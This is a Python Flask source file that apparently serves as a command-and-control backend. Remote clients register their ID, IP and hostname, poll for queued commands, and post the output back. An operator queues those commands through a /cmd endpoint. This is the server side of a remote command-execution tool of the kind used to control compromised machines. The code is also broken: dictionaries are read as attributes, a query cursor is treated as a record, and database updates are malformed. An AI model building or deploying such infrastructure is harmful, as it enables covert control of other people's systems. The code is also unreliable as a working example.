from flask import Flask, request, render_template
from flask_socketio import SocketIO
from flask_pymongo import PyMongo
from time import sleep
from json import loads

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

close = False

app = Flask("clients")
mongo = PyMongo(app)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)
@app.route('/new' , methods=["POST", "GET"])
def index():
    global close
    if request.method == 'POST':
        print("Received new client!")
        if request.get_json(True)["status"] == "1000":
            while True:
                client = mongo.db.clients.find({"id": request.get_json(True).id})
                if client.cmd != "":
                    break
                else:
                    sleep(2)
            return client.cmd
        elif request.get_json(True)["status"] == "1002":
            mongo.db.clients.update_one({"id": request.get_json(True).id}, {"output": request.get_json(True).output})
        else:
            clientID = request.get_json(True)["id"]
            ipAdd = request.get_json(True)["ip"]
            hostname = request.get_json(True)["hostname"]
            timeRun = request.get_json(True)["time"]
            mongo.db.clients.insert_one({"id": clientID, "ip": ipAdd, "hostname": hostname, "time": timeRun, "cmd": "", "output": ""})
            return "2000"
    return ""

@app.route('/cmd' , methods=["POST", "GET"])
def cmd():
    try:
        id = mongo.db.clients.find()[0].id
        mongo.db.clients.update_one({"id": id}, {"cmd": request.args.get("cmd")})
        while True:
            output = mongo.db.clients.find_one({"id": id}).output
            if output != "":
                return output
            else:
                sleep(2)
    except:
        return "no clients"


@app.route('/read' , methods=["GET"])
def read():
    return render_template("cmd.html")

@app.route('/poop' , methods=["GET", "POST"])
def poop():
    sleep(2)
    print("this is not working.......")
    return ""

if __name__ == "__main__":
    #app.run(debug=False, host='0.0.0.0', port=5000, threaded=True)
    socketio.run(app)